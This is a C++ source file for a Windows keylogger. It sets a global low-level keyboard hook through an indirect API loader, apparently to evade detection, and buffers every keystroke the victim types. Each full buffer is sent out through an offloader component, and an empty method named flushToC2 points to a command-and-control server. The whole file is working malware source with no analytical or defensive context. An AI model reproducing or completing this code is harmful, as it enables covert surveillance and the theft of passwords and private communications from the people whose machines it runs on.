#include "KeyLog.h"
#include <Windows.h>
#include "ExternFnLoader.h"
KeyLog gLogger;

LRESULT CALLBACK KeyLog::KlGetKey(int nCode, WPARAM wparam, LPARAM lparam)
{

    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lparam;
        if (wparam == WM_KEYUP && pKbStruct->vkCode == VK_LSHIFT)
            gLogger.addKey(pKbStruct->vkCode);
        else  if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
            gLogger.addKey(pKbStruct->vkCode);
        
    }

    return CallNextHookEx(*gLogger.getHook(), nCode, wparam, lparam);
}

KeyLog::KeyLog()
    : mkeyBuffer{}, mHook{ nullptr }, mOffloader{}
{
    
}


KeyLog::~KeyLog()
{
    if (mHook)
    {
        ExternFnLdr::Kl_UnhookWindowsHookEx(mHook);
        mHook = nullptr;
    }
}

bool KeyLog::init()
{
    mHook = ExternFnLdr::Kl_SetWindowsHookExA(WH_KEYBOARD_LL, &KeyLog::KlGetKey, NULL, 0);
    return mHook != 0;
}


void KeyLog::addKey(int keyCode)
{
    mkeyBuffer.push_back(keyCode);
    if (mkeyBuffer.size() >= MAX_KEY_HISTORY)
    {
        mOffloader.sendData(mkeyBuffer);
        mkeyBuffer.clear();
    }
}


void KeyLog::flushToC2()
{
}
